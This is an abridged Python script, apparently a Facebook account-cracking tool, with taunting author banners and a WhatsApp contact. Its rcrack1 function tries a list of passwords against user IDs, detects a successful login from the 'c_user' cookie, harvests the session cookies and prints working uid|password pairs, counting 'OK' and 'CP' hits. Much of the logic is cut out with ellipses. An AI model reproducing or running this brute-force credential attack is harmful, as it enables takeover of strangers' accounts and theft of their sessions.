#SC MAKED BY ZIHAD ISLAM  🤣 and Fuked By FB-KING 🙄
#Tera pappa FB-KING 😘 MEHEDI ISLAM
#................♥CYBER♥................
...
╔═════════════════════════════════════════════╗
║  [+] AUTHOR   : ZIHAD ISLAM MEHEDI        ║
║  [+] WHATSAPP : +8801875525411              ║
...
class Main:
    def __init__(self):
        ...
        self.loop = 0
        os.system("clear")
        os.system('xdg-open fb://gr258862096423615ref=share&mibextid=NSMWBT')
        print(logo)
...
def v1():
    user=[]
    os.system('clear')
    os.system('xdg-open fb://group/258862096423615?ref=share&mibextid=NSMWBT')
    print(logo)
...
def rcrack1(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write('\r[\033[1;92mCYBER\033[1;97m] [%s/%s] [\033[1;92mOK\033[1;97m:-\033[1;92m%s\033[1;97m] [\033[1;91mCP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))),
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\x1b[38;5;196m[CYBER-CP🔒] {uid}|{ps}")
                ...
                continue
        loop+=1
        sys.stdout.write(f'\r\033[m[CYBER💉] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
Main()
